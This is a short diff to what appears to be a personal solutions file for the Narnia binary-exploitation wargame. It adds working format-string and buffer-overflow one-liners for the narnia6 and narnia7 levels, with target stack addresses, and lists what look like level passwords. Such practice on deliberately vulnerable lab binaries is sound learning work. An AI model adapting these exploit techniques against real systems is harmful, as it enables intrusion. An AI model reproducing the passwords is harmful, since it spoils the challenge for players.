@@ -12,3 +12,18 @@ faimahchiy
 
 ./narnia5 `python -c 'print "\xa0\xd4\xff\xff"+"x"*496+"%n"'`
 neezocaeng
+
+env -i COLUMNS=181 PWD=/narnia LINES=81 /narnia/narnia6 asdf `python -c 'print "xxxxxxxx"+"/tmp/9/a\x50\xc8\xe4\xf7"'`
+
+ahkiaziphu
+
+env -i COLUMNS=181 PWD=/narnia LINES=81 /narnia/narnia7 asdf `python -c 'print "\x88\xdd\xff\xff%n"'`
+
+0xffffdd98
+24 87 04 08
+
+env -i COLUMNS=181 PWD=/narnia LINES=81 /narnia/narnia7 `python -c 'print "xxxx\xf8\xd5\xff\xffxxxx\xf9\xd5\xff\xffxxxx\xfa\xd5\xff\xffxxxx\xfb\xd5\xff\xff%12x%n%99x%n%125x%n%x%n"'`
+0xffffd5f8  24
+0xffffd5f9  87
+0xffffd5fa  04
+0xffffd5fb  08
